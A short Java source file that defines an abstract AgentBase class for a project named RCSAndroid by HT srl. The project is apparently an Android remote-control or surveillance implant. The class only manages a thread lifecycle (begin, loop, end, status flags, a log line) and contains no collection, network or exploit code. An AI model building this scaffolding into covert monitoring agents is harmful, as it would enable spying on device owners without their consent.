/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 30-mar-2011
 **********************************************/

package com.ht.RCSAndroidGUI.agent;

import android.util.Log;

import com.ht.RCSAndroidGUI.ThreadBase;

// TODO: Auto-generated Javadoc
/**
 * The Class AgentBase.
 */
public abstract class AgentBase extends ThreadBase implements Runnable {
	// Gli eredi devono implementare i seguenti metodi astratti
	/**
	 * Begin.
	 */
	public abstract void begin();

	/**
	 * End.
	 */
	public abstract void end();

	/**
	 * Parses the.
	 * 
	 * @param conf
	 *            the conf
	 */
	public abstract void parse(byte[] conf);

	/*
	 * (non-Javadoc)
	 * 
	 * @see java.lang.Thread#run()
	 */
	public synchronized void run() {
		// Check.asserts(agentEnabled, string)
		status = Agent.AGENT_RUNNING;

		begin();
		loop();
		end();

		status = Agent.AGENT_STOPPED;
		Log.d("RCS", "AgentBase stopped");
	}
}